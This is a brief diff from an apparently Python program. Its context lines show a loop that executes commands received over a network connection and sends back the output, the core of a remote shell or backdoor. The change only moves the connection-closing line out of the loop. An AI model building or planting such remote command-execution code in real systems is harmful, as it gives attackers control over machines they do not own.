@@ -35,4 +35,4 @@ while True:
     command_result = execute_system_command(command)
     connection.send(command_result)
 
-    connection.close()                                              # closes connection
+connection.close()                                              # closes connection
